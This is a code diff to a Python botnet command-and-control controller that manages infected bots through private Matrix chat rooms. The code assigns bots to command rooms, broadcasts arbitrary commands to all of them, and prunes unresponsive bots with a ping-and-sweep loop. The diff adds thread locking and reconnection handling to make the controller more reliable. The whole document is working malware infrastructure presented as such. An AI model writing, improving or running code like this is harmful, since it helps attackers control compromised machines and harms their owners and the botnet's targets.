@@ -55,8 +55,14 @@ class CommandRoom:
     def remove_bot(self, bot_id):
         del self.bots[bot_id]
         
-    def set_active(self, bot_id):
+    def set_active(self, bot_id) -> bool:
+        """
+        return False if bot_id doesnt exist
+        """
+        if bot_id not in self.bots:
+            return False
         self.bots[bot_id][1] = True
+        return True
     
     def set_all_inactive(self):
         for bot in self.bots.values():
@@ -77,12 +83,13 @@ class BotnetController:
     access_token: str
     announce_room: Room
     command_rooms: dict[str, CommandRoom]
-    
+    command_room_lock: threading.Lock
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
         self.pinging = False
         self.client = MatrixClient(MATRIX_HOMESERVER)
         self.command_rooms = {}
+        self.command_room_lock = threading.Lock()
 
     def login(self):
         # login and sync
@@ -113,36 +120,41 @@ class BotnetController:
         joined_rooms: dict[str, Room] = self.client.rooms
         for id, room in joined_rooms.items():
             if room.name.startswith("cmd_"):
-                self.command_rooms[id] = CommandRoom(room)
+                with self.command_room_lock:
+                    self.command_rooms[id] = CommandRoom(room)
             elif room.name == "announcements":
                 self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
 
-    def send_command(self, command, room):
+    def send_command(self, command: str, room: CommandRoom):
         response = room.send_cmd(f"COMMAND:{command}")
         # TODO: check for successfull response?
         # print(f"[+] Sent command: {command}")
         
-    def send_to_all(self, command):
-        for id, cmd_room in self.command_rooms.items():
-            self.send_command(command, cmd_room)
+    def send_to_all(self, command: str):
+        with self.command_room_lock:
+            for _, cmd_room in self.command_rooms.items():
+                self.send_command(command, cmd_room)
             
     def assign_bot(self, botdata, roomid):
+        """
+        Lock needs to be aquired
+        """
         self.command_rooms[roomid].add_bot(botdata)
         
     def clear_room(self, room):
         self.send_command("CLEAR:ALL", room)
         
     def delete_room(self, room: CommandRoom):
-        self.clear_room(room)
-        time.sleep(1)
-        room.leave()
-        del self.command_rooms[room.room.room_id]
+        with self.command_room_lock:
+            self.clear_room(room)
+            room.leave()
+            del self.command_rooms[room.room.room_id]
 
-    def on_message(self, room, event):
+    def on_message(self, _room, event):
         msgbody: str = event["content"]["body"]
         action, info = msgbody.split(":", 1)
         
-        if action == "CONNECT" and not self.pinging:
+        if action == "CONNECT":
             if len(self.command_rooms) == 0:
                 return
             msgbody = msgbody.removeprefix("CONNECT:")
@@ -150,42 +162,53 @@ class BotnetController:
             botid = msgbody["bot_id"]
             # Uniform distr so should be fine
             room_id = random.choice(list(self.command_rooms.keys()))
+            if not self.command_room_lock.acquire(False):
+                return
             self.announce_room.send_text(
                 f"RESOLVE {botid}:{room_id}"
             )
             self.assign_bot(msgbody, room_id)
+            self.command_room_lock.release()
             
-        elif action == "DISCONNECT" and not self.pinging:
+        elif action == "DISCONNECT":
+            if not self.command_room_lock.acquire(False):
+                return
             room_id, bot_id = info.rsplit(":", 1)
             self.command_rooms[room_id].remove_bot(bot_id)
+            self.command_room_lock.release()
             
-        elif action == "PONG" and self.pinging:
+        elif action == "PONG":
             room_id, bot_id = info.rsplit(":", 1)
-            self.command_rooms[room_id].set_active(bot_id)
+            # if for some reason the bots PONG is received later than or during the SWEEP
+            # tell the bot to just reconnect to the botnet
+            # unlikely but better safe than sorry
+            if self.command_room_lock.locked() or not self.command_rooms[room_id].set_active(bot_id):
+                self.send_command(f"CLEAR:{bot_id}", self.command_rooms[room_id])
             
     def create_room(self, name: str) -> Room:
         room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
         room.set_room_name(name)
-        time.sleep(1)
         return room
     
     def add_command_room(self, name: str):
         new_room = self.create_room(f"cmd_{name}")
-        self.command_rooms[new_room.room_id] = CommandRoom(new_room)
+        with self.command_room_lock:
+            self.command_rooms[new_room.room_id] = CommandRoom(new_room)
 
     def ping_loop(self):
         while True:
             time.sleep(8) # every 8 sec
-            self.pinging = True
             # Mark
-            for room in self.command_rooms.values():
-                room.set_all_inactive()
+            with self.command_room_lock:
+                for room in self.command_rooms.values():
+                    room.set_all_inactive()
+            
             self.send_to_all("PING")
             time.sleep(5) # wait a bit
-            # & Sweep
-            for room in self.command_rooms.values():
-                room.delete_inactive_bots()
-            self.pinging = False
+            # and Sweep
+            with self.command_room_lock:
+                for room in self.command_rooms.values():
+                    room.delete_inactive_bots()
 
     def run(self):
         self.login()
